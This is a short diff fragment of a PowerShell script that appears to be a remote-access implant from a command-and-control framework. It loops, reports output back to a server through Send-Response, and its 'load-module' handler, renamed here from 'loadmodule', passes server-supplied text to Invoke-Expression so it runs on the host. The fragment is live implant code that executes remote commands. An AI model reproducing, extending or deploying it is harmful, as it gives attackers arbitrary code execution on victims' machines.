@@ -292,9 +292,9 @@ while($true)
                                   $Output = "ErrorDownload: " + $error[0]
                                   Send-Response $Server $key $id $Output
                               }
-                          } elseif ($i.ToLower().StartsWith("loadmodule")) {
+                          } elseif ($i.ToLower().StartsWith("load-module")) {
                               try {
-                                  $modulename = $i -replace "LoadModule",""
+                                  $modulename = $i -replace "load-module",""
                                   $Output = Invoke-Expression $modulename | out-string
                                   $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
                               } catch {
